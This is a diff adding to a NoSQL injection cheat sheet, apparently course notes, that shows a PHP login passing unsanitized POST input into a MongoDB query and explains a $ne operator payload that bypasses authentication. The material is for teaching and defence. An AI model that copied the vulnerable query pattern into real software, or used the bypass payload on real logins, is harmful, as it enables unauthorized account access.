@@ -1,4 +1,5 @@
 MongoDB Usage
+```
 Connect to MongoDB: mongosh mongodb://127.0.0.1:27017
 List databases: show databases
 List collections: show collections
@@ -53,6 +54,38 @@ This cheat sheet contains a (non-comprehensive) list of payloads you may use whe
 
 Some other resources you may want to refer to may be:
 
+```
+```
+Code: php
+...
+if ($_SERVER['REQUEST_METHOD'] === "POST"):
+    if (!isset($_POST['email'])) die("Missing `email` parameter");
+    if (!isset($_POST['password'])) die("Missing `password` parameter");
+    if (empty($_POST['email'])) die("`email` can not be empty");
+    if (empty($_POST['password'])) die("`password` can not be empty");
+
+    $manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
+    $query = new MongoDB\Driver\Query(array("email" => $_POST['email'], "password" => $_POST['password']));
+    $cursor = $manager->executeQuery('mangomail.users', $query);
+        
+    if (count($cursor->toArray()) > 0) {
+        ...
+We can see that the server checks if email and password are both given and non-empty before doing anything with them. Once that is verified, it connects to a MongoDB instance running locally and then queries mangomail to see if there is a user with the given pair of email and password, like so:
+
+Code: javascript
+db.users.find({
+    email: "<email>",
+    password: "<password>"
+});
+The problem is that both email and username are user-controlled inputs, which are passed unsanitized into a MongoDB query. This means we (as attackers) can take control of the query.
+
+Many query operators were introduced in the first section of this module, and you may already have an idea of how to manipulate this query. For now, we want this query to return a match on any document because this will result in us being authenticated as whoever it matched. A straightforward way to do this would be to use the $ne query operator on both email and password to match values that are not equal to something we know doesn't exist. To put it in words, we want a query that matches email is not equal to 'test@test.com', and the password is not equal to 'test'.
+
+Code: javascript
+db.users.find({
+    email: {$ne: "test@test.com"},
+    password: {$ne: "test"}
+});
 
 Some other payloads that would work are:
 ```
